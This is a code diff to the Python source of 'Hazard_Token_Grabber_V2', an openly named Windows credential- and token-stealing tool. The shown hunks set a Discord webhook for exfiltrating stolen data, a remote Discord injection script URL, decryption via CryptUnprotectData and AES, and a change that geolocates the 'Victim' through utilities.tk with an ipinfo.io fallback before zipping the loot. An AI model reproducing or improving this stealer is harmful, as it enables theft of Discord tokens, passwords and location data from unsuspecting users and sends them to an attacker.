@@ -1,15 +1,4 @@
-import os
-import json
-import httpx
-import winreg
-import ctypes
-import shutil
-import psutil
-import asyncio
-import sqlite3
-import zipfile
-import threading
-import subprocess
+import os, json, httpx, winreg, ctypes, shutil, psutil, asyncio, sqlite3, zipfile, threading, subprocess
 
 from sys import argv
 from PIL import ImageGrab
@@ -20,10 +9,10 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
+    # replace WEBHOOK_HERE with your webhook (or your domain from the webhook protector API)
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted 
     'webhook': "WEBHOOK_HERE",
-    #ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
+    # [!] ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector [!]
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
@@ -505,15 +494,28 @@ class Hazard_Token_Grabber_V2(functions):
         org = "N/A"
         loc = "N/A"
         googlemap = "N/A"
-        data = httpx.get("https://ipinfo.io/json").json()
-        ip = data.get('ip')
-        city = data.get('city')
-        country = data.get('country')
-        region = data.get('region')
-        org = data.get('org')
-        loc = data.get('loc')
-        googlemap = "https://www.google.com/maps/search/google+map++" + loc
-
+        try:
+            data = httpx.get("https://utilities.tk/network/info").json()
+            ip = data.get('ip')
+            city = data.get('city')
+            country = data.get('country')
+            region = data.get('region')
+            org = data.get('org')
+            loc = data.get('loc')
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+        except:
+                try:
+                    data = httpx.get("https://ipinfo.io/json").json()
+                    ip = data.get('ip')
+                    city = data.get('city')
+                    country = data.get('country')
+                    region = data.get('region')
+                    org = data.get('org')
+                    loc = data.get('loc')
+                    googlemap = "https://www.google.com/maps/search/google+map++" + loc
+                except:
+                    pass
+                
         _zipfile = os.path.join(
             self.appdata, f'Hazard.V2-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
